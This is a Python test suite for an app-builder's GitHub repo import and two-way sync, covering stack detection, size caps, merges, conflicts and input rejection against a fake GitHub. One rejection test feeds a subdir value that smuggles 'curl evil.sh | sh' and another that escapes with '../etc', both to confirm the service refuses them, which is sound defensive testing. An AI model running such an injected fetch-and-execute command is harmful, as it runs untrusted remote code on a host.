"""Import an existing GitHub repo + two-way sync (app/repo_import.py,
app/repo_sync.py, github_client compare/merge).

Pure detection/size-cap helpers are tested directly; the routes are exercised
through starlette's TestClient against tests/fake_github.py (an in-process
object model with a real commit graph, three-way file merge and compare - NOT
real GitHub, which is not reachable from here). code-intel is mocked.

Run: python -m tests.test_repo_sync   (from the app-builder directory)
"""

from __future__ import annotations

import json
import os
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from cryptography.fernet import Fernet  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

from app import github_client, main, repo_import, repo_sync  # noqa: E402
from app.codeintel_client import client as ci_client  # noqa: E402
from app.github_client import GitHubClient  # noqa: E402
from app.settings import Settings  # noqa: E402
from tests.fake_github import FakeGitHub  # noqa: E402

PASS = 0
FAIL = 0
API = "https://api.github.test"
TOKEN = "github_pat_11SYNC_secret"
REPO = "acme/widgets"
HDRS = {"X-Tenant-Id": "tenant_a"}


def check(name: str, cond: bool, extra: str = ""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ok    {name}")
    else:
        FAIL += 1
        print(f"  FAIL  {name} {extra}")


def _names(*paths):
    return set(paths)


def _reader(files: dict):
    return lambda rel: files.get(rel)


REACT_PKG = json.dumps({
    "scripts": {"dev": "vite", "build": "vite build", "test": "vitest"},
    "dependencies": {"react": "^18"}, "devDependencies": {"vite": "^5"}})


def test_detection():
    print("== stack detection (pure) ==")
    files = {"package.json": REACT_PKG}
    m = repo_import.detect_stack(_names("package.json", "src/App.jsx",
                                        "package-lock.json"), _reader(files))
    check("react+vite detected", m["stack"] == "node-react", str(m))
    check("npm ci with a package-lock", m["install"] == "npm ci")
    check("vitest test script gets --run", m["test"] == "npm test -- --run")
    check("vite dev flags bind 0.0.0.0", "--host 0.0.0.0" in m["run"])
    check("manifest marked detected", m["detected"] is True)

    m = repo_import.detect_stack(
        _names("package.json", "yarn.lock"), _reader(files))
    check("yarn.lock picks yarn", m["install"].startswith("yarn install"))

    astro = {"package.json": json.dumps({
        "scripts": {"build": "astro build", "dev": "astro dev"},
        "dependencies": {"astro": "^4"}})}
    m = repo_import.detect_stack(_names("package.json", "astro.config.mjs"),
                                 _reader(astro))
    check("astro detected", m["stack"] == "astro-site" and m["port"] == 4321)

    cap = {"package.json": json.dumps({
        "scripts": {"build": "vite build", "dev": "vite"},
        "dependencies": {"react": "1", "@capacitor/core": "6"}})}
    m = repo_import.detect_stack(
        _names("package.json", "capacitor.config.ts"), _reader(cap))
    check("capacitor wins over react", m["stack"] == "capacitor-app")

    m = repo_import.detect_stack(
        _names("requirements.txt", "main.py"),
        _reader({"requirements.txt": "fastapi==0.110\nuvicorn\n"}))
    check("fastapi via requirements", m["stack"] == "python-fastapi"
          and "main:app" in m["run"] and m["install"].startswith("pip install -r"))

    m = repo_import.detect_stack(
        _names("pyproject.toml", "app/main.py"),
        _reader({"pyproject.toml": "[project]\ndependencies=['FastAPI','pytest']"}))
    check("fastapi via pyproject + app/main.py",
          "app.main:app" in m["run"] and m["test"] == "pytest -q", str(m))

    m = repo_import.detect_stack(_names("index.html", "style.css"), _reader({}))
    check("plain index.html is static-html", m["stack"] == "static-html")

    m = repo_import.detect_stack(
        _names("package.json"),
        _reader({"package.json": json.dumps({"scripts": {"start": "node x.js"}})}))
    check("generic node uses npm start", m["stack"] == "node"
          and m["run"] == "npm start")

    try:
        repo_import.detect_stack(_names("README.md", "notes.txt"), _reader({}))
        check("unknown stack raises", False)
    except repo_import.StackNotDetectedError:
        check("unknown stack raises", True)

    try:
        m = repo_import.detect_stack(_names("package.json"),
                                     _reader({"package.json": "{not json"}))
        check("broken package.json falls to generic node", m["stack"] == "node")
    except Exception as e:  # noqa: BLE001
        check("broken package.json falls to generic node", False, str(e))

    scoped = repo_import.scope_manifest(
        repo_import.detect_stack(_names("package.json"), _reader(files)),
        "apps/web")
    check("subdir prefixes commands", scoped["install"] ==
          "cd apps/web && npm install" and scoped["run"].startswith(
              "cd apps/web && "), str(scoped))
    check("subdir rebases preview_dir", scoped["preview_dir"] == "apps/web/dist")

    check("project id derived from repo + subdir",
          repo_import.derive_project_id("acme/widgets", "apps/web", set())
          == "widgets-apps-web")
    check("project id de-duplicated",
          repo_import.derive_project_id("acme/widgets", None, {"widgets"})
          == "widgets-2")


def test_size_caps():
    print("== size caps (pure) ==")
    entries = [
        {"path": "package.json", "size": 100},
        {"path": "src/a.js", "size": 100},
        {"path": "node_modules/x/index.js", "size": 10_000_000},
        {"path": "dist/bundle.js", "size": 10_000_000},
        {"path": "public/logo.png", "size": 10_000_000},
        {"path": "web/node_modules/y.js", "size": 5},
    ]
    kept, stats = repo_import.filter_tree(entries, 10, 10_000)
    check("vendored + binaries skipped",
          [e["path"] for e in kept] == ["package.json", "src/a.js"], str(kept))
    check("stats count skips", stats["skipped_vendored"] == 3
          and stats["skipped_binary"] == 1 and stats["files"] == 2, str(stats))

    try:
        repo_import.filter_tree(entries, 1, 10_000)
        check("file cap enforced", False)
    except repo_import.ImportTooLargeError:
        check("file cap enforced", True)
    try:
        repo_import.filter_tree(entries, 10, 150)
        check("byte cap enforced", False)
    except repo_import.ImportTooLargeError:
        check("byte cap enforced", True)

    sub = repo_import.scope_entries(entries, "src")
    check("scope_entries keeps only the subdir",
          [e["path"] for e in sub] == ["src/a.js"])


def test_pure_sync_helpers():
    print("== sync helpers (pure) ==")
    st = repo_sync.summarize_status(
        {"status": "diverged", "ahead_by": 2, "behind_by": 3}, "main", "b")
    check("diverged summary", st["diverged"] and st["can_pull"]
          and not st["up_to_date"])
    st = repo_sync.summarize_status(
        {"status": "ahead", "ahead_by": 2, "behind_by": 0}, "main", "b")
    check("ahead only is up to date", st["up_to_date"] and not st["can_pull"])

    cs = [
        {"sha": "1", "message": "AI: add nav", "author_name": "octocat",
         "author_email": "", "author_login": "", "date": ""},
        {"sha": "2", "message": "hotfix", "author_name": "Jane",
         "author_email": "j@x.io", "author_login": "", "date": ""},
        {"sha": "3", "message": "x", "author_name":
            github_client.BUILDER_AUTHOR_NAME, "author_email": "",
         "author_login": "", "date": ""},
        {"sha": "4", "message": "app-builder: merge main into b",
         "author_name": "bob", "author_email": "", "author_login": "",
         "date": ""},
    ]
    ext = repo_sync.external_commits(cs)
    check("only the human commit is external",
          [c["sha"] for c in ext] == ["2"], str(ext))


class Scenario:
    def __init__(self, seed: dict, **settings_kw):
        self.tmp = tempfile.mkdtemp(prefix="appbuilder-test-sync-")
        self.key = Fernet.generate_key().decode()
        self.fake = FakeGitHub(api_base=API, token=TOKEN, repo=REPO)
        if seed:
            self.fake.add_commit("main", seed, message="seed",
                                 author_name="owner",
                                 author_email="o@example.com")
        github_client.httpx = self.fake.shim()
        self.registrations: list[dict] = []
        self.indexed: list[str] = []
        ci_client.register_repo = (lambda c, rid, **kw:
                                   self.registrations.append(
                                       {"repo_id": rid, **kw}) or {})
        ci_client.index_repo = lambda c, rid, **kw: self.indexed.append(rid) or {}
        ci_client.delete_repo = lambda c, rid: {}
        main.SETTINGS = Settings(
            data_dir=self.tmp, templates_dir=os.path.join(ROOT, "templates"),
            auth_mode="none", app_builder_encryption_key=self.key,
            github_api_url=API, local_preview_enabled=False, **settings_kw)
        self.client = TestClient(main.app)

    def connect(self):
        r = self.client.post("/projects/github/connect", headers=HDRS,
                             json={"token": TOKEN, "repo_full_name": REPO})
        assert r.status_code == 200, r.text

    def imp(self, **body):
        return self.client.post(
            "/projects/import", headers=HDRS,
            json={"repo_full_name": REPO, **body})

    def branch_gh(self) -> GitHubClient:
        return GitHubClient(TOKEN, main.SETTINGS)


REACT_SEED = {
    "package.json": REACT_PKG,
    "src/App.jsx": "export default () => 'v1'\n",
    "src/util.js": "export const a = 1\n",
    "node_modules/left-pad/index.js": "x",
    "public/logo.png": "not-really-png",
}


def test_import_flow_and_sync():
    print("== POST /projects/import ==")
    sc = Scenario(REACT_SEED)
    r = sc.imp()
    check("import needs a connected repo (409)", r.status_code == 409, r.text)

    sc.connect()
    before_main = sc.fake.file_paths("main")
    r = sc.imp(project_id="widgets")
    check("import 201", r.status_code == 201, r.text)
    proj = r.json()
    gh = proj.get("github") or {}
    check("record marked imported with detected stack",
          gh.get("imported") is True
          and gh.get("manifest", {}).get("stack") == "node-react", str(gh))
    check("template_id names the detected stack",
          proj["template_id"] == "import-node-react")
    check("app-builder branch created from base",
          gh.get("branch") in sc.fake.refs
          and sc.fake.refs[gh["branch"]] == sc.fake.refs["main"])
    check("nothing committed into the user's repo",
          sc.fake.file_paths(gh["branch"]) == before_main
          and sc.fake.file_paths("main") == before_main
          and not any(q["method"] == "POST" and "/git/blobs" in q["url"]
                      for q in sc.fake.requests))
    check("no PR opened, none faked",
          gh.get("pr_number") is None and not sc.fake.pulls)
    check("import stats skip node_modules and the png",
          gh["import_stats"]["skipped_vendored"] == 1
          and gh["import_stats"]["skipped_binary"] == 1, str(gh))
    check("registered + indexed in code-intel as git source",
          len(sc.registrations) == 1
          and sc.registrations[0]["source_type"] == "git"
          and sc.registrations[0]["git_ref"] == gh["branch"]
          and sc.indexed == ["widgets"])
    check("status ready", proj["status"] == "ready")
    check("token never in the response", TOKEN not in r.text)
    stored = open(os.path.join(sc.tmp, "tenants", "tenant_a", "projects.json"),
                  encoding="utf-8").read() if os.path.exists(os.path.join(
                      sc.tmp, "tenants", "tenant_a", "projects.json")) else ""
    check("token not in project registry", TOKEN not in stored)

    r = sc.imp(project_id="widgets")
    check("re-importing the same project id is 409", r.status_code == 409,
          r.text)

    branch = gh["branch"]
    print("== sync status / detect-external ==")
    r = sc.client.get("/projects/widgets/sync/status", headers=HDRS)
    check("status 200", r.status_code == 200, r.text)
    check("fresh import is 0 ahead 0 behind",
          r.json()["ahead_by"] == 0 and r.json()["behind_by"] == 0
          and r.json()["up_to_date"] is True, r.text)

    r = sc.client.post("/projects/widgets/sync/detect-external", headers=HDRS)
    check("no external edits on a fresh branch",
          r.status_code == 200 and r.json()["edited_outside"] is False
          and r.json()["count"] == 0, r.text)

    # a builder commit is ahead but NOT external
    sc.branch_gh().commit_files(
        REPO, branch, [{"path": "src/new.js", "content": "1"}], "AI: add new")
    r = sc.client.get("/projects/widgets/sync/status", headers=HDRS)
    check("builder commit makes the branch 1 ahead",
          r.json()["ahead_by"] == 1 and r.json()["behind_by"] == 0, r.text)
    r = sc.client.post("/projects/widgets/sync/detect-external", headers=HDRS)
    check("a builder commit is not 'external'", r.json()["count"] == 0,
          r.text)

    sc.fake.add_commit(branch, {"src/util.js": "export const a = 2\n"},
                       message="tweak util", author_name="Jane Dev")
    r = sc.client.post("/projects/widgets/sync/detect-external", headers=HDRS)
    body = r.json()
    check("human commit on the branch is detected",
          body["edited_outside"] is True and body["count"] == 1
          and body["commits"][0]["message"] == "tweak util"
          and body["commits"][0]["author"] == "Jane Dev", r.text)

    print("== sync/pull clean merge ==")
    sc.fake.add_commit("main", {"README.md": "# updated upstream\n"},
                       message="docs", author_name="owner")
    r = sc.client.get("/projects/widgets/sync/status", headers=HDRS)
    check("base moved: branch is behind 1 and diverged",
          r.json()["behind_by"] == 1 and r.json()["diverged"] is True
          and r.json()["can_pull"] is True, r.text)
    sc.indexed.clear()
    r = sc.client.post("/projects/widgets/sync/pull", headers=HDRS)
    check("pull 200 merged", r.status_code == 200
          and r.json()["merged"] is True, r.text)
    check("upstream file landed on the branch, our edits kept",
          sc.fake.file_text(branch, "README.md") == "# updated upstream\n"
          and sc.fake.file_text(branch, "src/util.js")
          == "export const a = 2\n"
          and "src/new.js" in sc.fake.file_paths(branch))
    check("merge is a two-parent commit",
          len(sc.fake.commits[sc.fake.refs[branch]]["parents"]) == 2)
    check("project record tracks the new tip",
          (sc.client.get("/projects/widgets", headers=HDRS).json()["github"]
           ["commit_sha"]) == sc.fake.refs[branch])
    check("code-intel re-indexed after the merge", sc.indexed == ["widgets"])
    r = sc.client.get("/projects/widgets/sync/status", headers=HDRS)
    check("behind 0 after pull", r.json()["behind_by"] == 0, r.text)
    r = sc.client.post("/projects/widgets/sync/detect-external", headers=HDRS)
    check("our own merge commit is not 'external'",
          r.json()["count"] == 1, r.text)

    r = sc.client.post("/projects/widgets/sync/pull", headers=HDRS)
    check("pulling when current is a calm no-op",
          r.status_code == 200 and r.json()["merged"] is False
          and r.json()["up_to_date"] is True, r.text)

    print("== sync/pull conflict -> 409, no half state ==")
    sc.fake.add_commit("main", {"src/App.jsx": "export default () => 'main'\n"},
                       message="main edit", author_name="owner")
    sc.fake.add_commit(branch, {"src/App.jsx": "export default () => 'br'\n"},
                       message="branch edit", author_name="Jane Dev")
    tip_before = sc.fake.refs[branch]
    commit_before = (sc.client.get("/projects/widgets", headers=HDRS).json()
                     ["github"]["commit_sha"])
    n_commits = len(sc.fake.commits)
    r = sc.client.post("/projects/widgets/sync/pull", headers=HDRS)
    check("conflict is a 409", r.status_code == 409, r.text)
    check("body lists the conflicted paths",
          r.json().get("conflicted_paths") == ["src/App.jsx"], r.text)
    check("body keeps the platform error shape",
          {"timestamp", "status", "error"} <= set(r.json()))
    check("branch tip unchanged", sc.fake.refs[branch] == tip_before)
    check("no stray commit created", len(sc.fake.commits) == n_commits)
    check("project record unchanged",
          (sc.client.get("/projects/widgets", headers=HDRS).json()["github"]
           ["commit_sha"]) == commit_before)

    print("== unknown project / local project ==")
    r = sc.client.get("/projects/nope/sync/status", headers=HDRS)
    check("unknown project 404", r.status_code == 404, r.text)


def test_import_rejections():
    print("== import rejections leave no branch behind ==")
    sc = Scenario(REACT_SEED, import_max_files=2)
    sc.connect()
    refs_before = dict(sc.fake.refs)
    r = sc.imp(project_id="big")
    check("over the file cap is 413", r.status_code == 413, r.text)
    check("no branch created on 413", sc.fake.refs == refs_before)
    check("no project registered on 413",
          sc.client.get("/projects", headers=HDRS).json() == [])

    sc = Scenario({"notes.txt": "hello"})
    sc.connect()
    refs_before = dict(sc.fake.refs)
    r = sc.imp(project_id="mystery")
    check("undetectable stack is 422", r.status_code == 422, r.text)
    check("no branch created on 422", sc.fake.refs == refs_before)

    sc = Scenario(REACT_SEED)
    sc.connect()
    r = sc.imp(project_id="x", subdir="../etc")
    check("path-escaping subdir refused", r.status_code == 400, r.text)
    r = sc.imp(project_id="x", subdir="a; curl evil.sh | sh")
    check("shell metacharacters in subdir refused", r.status_code == 400,
          r.text)
    r = sc.imp(project_id="x", base_branch="nope")
    check("missing base branch is 404", r.status_code == 404, r.text)
    r = sc.client.post("/projects/import", headers=HDRS,
                       json={"repo_full_name": "not-a-repo"})
    check("malformed repo name is 422", r.status_code == 422, r.text)


def test_subdir_import():
    print("== monorepo subdir import ==")
    sc = Scenario({
        "README.md": "# mono\n",
        "apps/web/package.json": REACT_PKG,
        "apps/web/src/App.jsx": "x",
        "apps/api/requirements.txt": "fastapi\n",
        "apps/api/main.py": "app = 1\n",
    })
    sc.connect()
    r = sc.imp(subdir="apps/web")
    check("subdir import 201", r.status_code == 201, r.text)
    body = r.json()
    man = body["github"]["manifest"]
    check("stack detected inside the subdir", man["stack"] == "node-react")
    check("commands are scoped with cd", man["install"] ==
          "cd apps/web && npm install", str(man))
    check("project id derived", body["project_id"] == "widgets-apps-web")
    check("subdir recorded", body["github"]["subdir"] == "apps/web")

    r = sc.imp(subdir="apps/api")
    check("second subdir of same repo gets its own project",
          r.status_code == 201 and r.json()["project_id"]
          == "widgets-apps-api"
          and r.json()["github"]["manifest"]["stack"] == "python-fastapi",
          r.text)

    r = sc.imp(subdir="apps/missing")
    check("empty subdir is 422", r.status_code == 422, r.text)

    from app import scaffold
    from app.tenancy import TenantContext
    ctx = TenantContext(tenant_id="tenant_a", subject="test")
    m = scaffold.project_manifest(ctx, "widgets-apps-web", main.SETTINGS)
    check("generate's project_manifest returns the synthesized manifest",
          m.get("stack") == "node-react" and m["install"].startswith("cd "),
          str(m))


def test_client_conflict_paths_and_author():
    print("== github_client compare/merge/author ==")
    sc = Scenario({"a.txt": "1", "b.txt": "1"})
    gh = sc.branch_gh()
    base_sha = sc.fake.refs["main"]
    gh.create_branch(REPO, "feat/x", base_sha)
    gh.commit_files(REPO, "feat/x", [{"path": "a.txt", "content": "2"}], "m")
    commit = sc.fake.commits[sc.fake.refs["feat/x"]]
    check("API commits carry the builder author",
          commit["author"]["name"] == github_client.BUILDER_AUTHOR_NAME)
    sc.fake.add_commit("main", {"a.txt": "3", "b.txt": "3"}, message="up")
    try:
        gh.merge_branch(REPO, "feat/x", "main", "app-builder: merge")
        check("merge conflict raises", False)
    except github_client.MergeConflictError as e:
        check("only files changed on both sides are reported",
              e.paths == ["a.txt"], str(e.paths))
        check("conflict is status 409", e.status == 409)


def main_() -> int:
    orig_httpx = github_client.httpx
    orig_settings = main.SETTINGS
    ci_orig = (ci_client.register_repo, ci_client.index_repo,
               ci_client.delete_repo)
    try:
        test_detection()
        test_size_caps()
        test_pure_sync_helpers()
        test_import_flow_and_sync()
        test_import_rejections()
        test_subdir_import()
        test_client_conflict_paths_and_author()
    finally:
        github_client.httpx = orig_httpx
        main.SETTINGS = orig_settings
        (ci_client.register_repo, ci_client.index_repo,
         ci_client.delete_repo) = ci_orig
    print(f"\n{PASS} passed, {FAIL} failed")
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main_())
